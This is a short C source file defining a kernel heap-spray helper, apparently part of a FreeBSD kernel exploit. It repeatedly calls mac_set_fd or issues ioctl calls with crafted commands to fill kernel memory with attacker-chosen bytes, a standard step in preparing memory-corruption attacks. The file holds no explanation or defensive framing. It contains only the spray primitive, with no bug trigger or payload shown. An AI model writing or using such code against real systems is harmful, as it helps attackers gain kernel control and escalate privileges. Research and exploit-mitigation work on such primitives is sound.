#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/mac.h>
#include <string.h>

#define	SYS_IOCTL_SMALL_SIZE	128	/* bytes */
#define DEBUG 0

void spray(unsigned int spray_count, void* spray, unsigned int spray_length) {
	if ( spray_length <= SYS_IOCTL_SMALL_SIZE ) {
		for ( unsigned int i = 0; i < spray_count; i++ ) {
			struct mac m = (struct mac) {
				.m_buflen = spray_length,
				.m_string = spray
			};

			if ( mac_set_fd(-1, &m) != 0 ) {
				if ( DEBUG ) perror("__mac_set_fd");
			}
		}
	}
	else if ( spray_length < IOCPARM_MAX ) {
		unsigned long cmd = (spray_length << 16) | IOC_IN;

		for ( unsigned int i = 0; i < spray_count; i++ ) {
			if ( ioctl(0, cmd, spray) != 0 ) {
				if ( DEBUG ) perror("spray ioctl: ");
			}
		}
	}
	else {
		printf("spray length %u invalid (max %u)\n", spray_length, IOCPARM_MAX);
		exit(1);
	}
}